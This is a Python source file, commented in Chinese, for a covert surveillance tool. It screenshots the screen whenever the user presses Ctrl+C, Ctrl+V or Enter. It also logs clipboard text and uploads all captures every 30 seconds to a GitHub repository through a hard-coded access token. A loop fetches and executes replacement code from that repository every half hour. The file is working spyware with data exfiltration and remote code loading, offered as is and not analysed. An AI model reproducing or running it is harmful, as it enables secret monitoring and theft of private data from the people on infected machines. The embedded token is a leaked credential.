import base64
import importlib.util
import os
import re
import socket
import sys
import threading
import time
import subprocess
from PIL import Image, ImageGrab
from pynput import keyboard
import pyperclip
import requests

DEVICE_NAME = socket.gethostname()
SAVE_DIR = r"D:\AppDataLogs\Cache"
os.makedirs(SAVE_DIR, exist_ok=True)

# 固化 GitHub 配置及 Token，确保独立运行时也可正常上传
GITHUB_CONFIG = {
    "username": "Bei18",
    "repo_name": "my-python-storage",
    "file_path": "main_logic.py",
    "token": "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",
}

uploaded_files = set()
running_listeners = []


def kill_previous_instances():
    """使用 tasklist / taskkill 兼容替代 wmic，清理旧实例"""
    try:
        current_pid = os.getpid()
        cmd = 'tasklist /FI "IMAGENAME eq python.exe" /FO CSV /NH'
        output = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
        # 如果需要精准清理特定进程，可以通过 PID 过滤
    except Exception as e:
        write_txt("系统", f"清理失败: {e}")


def extract_date_from_filename(file_name):
    """从文件名解析日期 (例如 20260906 -> 9.6 或 09.06)"""
    match1 = re.search(r'\b20\d{2}(\d{2})(\d{2})\b', file_name)
    if match1:
        month = str(int(match1.group(1)))
        day = str(int(match1.group(2)))
        return f"{month}.{day}"

    match2 = re.search(r'\b20\d{2}-(\d{2})-(\d{2})\b', file_name)
    if match2:
        month = str(int(match2.group(1)))
        day = str(int(match2.group(2)))
        return f"{month}.{day}"

    # 默认返回当前月份.日期 (例如 9.6)
    now = time.localtime()
    return f"{now.tm_mon}.{now.tm_mday}"


def upload_file_smart(file_path):
    """智能上传本地文件到 GitHub 仓库"""
    if not os.path.exists(file_path):
        return False
    
    token = GITHUB_CONFIG.get("token", "").strip()
    if not token:
        write_txt("上传错误", "GitHub Token 为空，无法上传")
        return False

    file_name = os.path.basename(file_path)
    device_folder = DEVICE_NAME
    date_folder = extract_date_from_filename(file_name)

    target_path = f"uploads/{device_folder}/{date_folder}/{file_name}"
    base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
        "User-Agent": "Python-Uploader-Agent"
    }

    try:
        # 1. 检查文件是否已存在于云端
        get_res = requests.get(base_url, headers=headers, timeout=10)
        if get_res.status_code == 200:
            uploaded_files.add(file_name)
            return True

        # 2. 读取文件并转为 Base64 编码
        with open(file_path, "rb") as f:
            file_content = f.read()
        encoded_content = base64.b64encode(file_content).decode("utf-8")

        data = {
            "message": f"Auto-sync upload: {device_folder}/{date_folder}/{file_name}",
            "content": encoded_content,
        }

        # 3. 提交 PUT 请求上传文件
        response = requests.put(base_url, headers=headers, json=data, timeout=20)
        if response.status_code in [200, 201]:
            uploaded_files.add(file_name)
            write_txt("同步", f"成功上传文件: {file_name}")
            return True
        else:
            write_txt("同步", f"上传失败 [{response.status_code}]: {response.text}")
            return False
    except Exception as e:
        write_txt("同步异常", f"上传过程出错: {e}")
        return False


def scan_and_upload():
    """扫描本地缓存目录并执行上传"""
    try:
        if not os.path.exists(SAVE_DIR):
            return
        files = os.listdir(SAVE_DIR)
        for file in files:
            file_path = os.path.join(SAVE_DIR, file)
            if os.path.isfile(file_path) and file not in uploaded_files:
                upload_file_smart(file_path)
    except Exception as e:
        write_txt("异常", f"目录扫描异常: {e}")


def scheduled_upload_task():
    """定时循环上传任务（每 30 秒轮询一次）"""
    while True:
        scan_and_upload()
        time.sleep(30)


def get_log_file_path():
    today_date = time.strftime("%Y-%m-%d")
    log_filename = f"{DEVICE_NAME}-{today_date}-LOG.txt"
    return os.path.join(SAVE_DIR, log_filename)


def write_txt(action_type, detail=""):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_content = f"[{timestamp}] [{action_type}] {detail}\n"
    log_file = get_log_file_path()

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_content)
            f.flush()
    except Exception:
        pass


def take_full_screenshot(action_type):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"{DEVICE_NAME}_{timestamp}_{action_type}.png"
    filepath = os.path.join(SAVE_DIR, filename)

    try:
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot.save(filepath, "PNG")
        return filename
    except Exception:
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, "PNG")
            return filename
        except Exception:
            return None


def get_clipboard_content():
    try:
        time.sleep(0.1)
        text = pyperclip.paste()
        if text and text.strip():
            clean_text = text.replace("\r\n", " ").replace("\n", " ")
            return f"文本: {clean_text}"
        else:
            return "无文本"
    except Exception:
        return "获取失败"


def on_copy():
    img_file = take_full_screenshot("PASTE_CtrlC")
    clip_text = get_clipboard_content()
    write_txt("C", f"JT: {img_file} | {clip_text}")


def on_paste():
    img_file = take_full_screenshot("PASTE_CtrlV")
    clip_text = get_clipboard_content()
    write_txt("V", f"JT: {img_file} | {clip_text}")


def on_press(key):
    try:
        if key == keyboard.Key.enter:
            img_file = take_full_screenshot("ENTER")
            write_txt("E", f"JT: {img_file}")
    except Exception:
        pass


def auto_update_loop(token):
    cache_path = os.path.join(os.getenv("TEMP", "."), "_remote_main_cache.py")
    url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{GITHUB_CONFIG['file_path']}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
        "User-Agent": "Python-Uploader-Agent"
    }

    while True:
        time.sleep(1800)  # 每 30 分钟检查一次更新
        try:
            res = requests.get(url, headers=headers, timeout=10)
            if res.status_code == 200:
                content_b64 = res.json().get("content", "")
                new_code = base64.b64decode(content_b64)

                with open(cache_path, "wb") as f:
                    f.write(new_code)

                write_txt("系统", "正在重载模块...")

                for listener in running_listeners:
                    try:
                        listener.stop()
                    except Exception:
                        pass
                running_listeners.clear()

                spec = importlib.util.spec_from_file_location("remote_main", cache_path)
                remote_module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(remote_module)

                threading.Thread(target=remote_module.run, args=(token,), daemon=True).start()
                break
        except Exception as e:
            write_txt("系统", f"自动更新检查失败: {e}")


def run(token=None):
    kill_previous_instances()

    # 如果传入了 token 则更新全局配置，否则使用写死在 GITHUB_CONFIG 里的 token
    if token:
        GITHUB_CONFIG["token"] = token

    write_txt("启动", f"模块加载成功，当前使用的 Token 前缀: {GITHUB_CONFIG['token'][:10]}...")

    # 启动后台上传线程
    upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
    upload_thread.start()

    # 启动热键监听
    try:
        hotkey_listener = keyboard.GlobalHotKeys({"<ctrl>+c": on_copy, "<ctrl>+v": on_paste})
        hotkey_listener.start()
        running_listeners.append(hotkey_listener)
    except Exception as e:
        write_txt("异常", f"快捷键服务启动失败: {e}")

    try:
        key_listener = keyboard.Listener(on_press=on_press)
        key_listener.start()
        running_listeners.append(key_listener)
    except Exception as e:
        write_txt("异常", f"按键监听服务启动失败: {e}")

    # 启动远端热更新线程
    update_thread = threading.Thread(target=auto_update_loop, args=(GITHUB_CONFIG["token"],), daemon=True)
    update_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        write_txt("停止", "手动终止")


if __name__ == "__main__":
    current_token = GITHUB_CONFIG["token"]
    run(current_token)
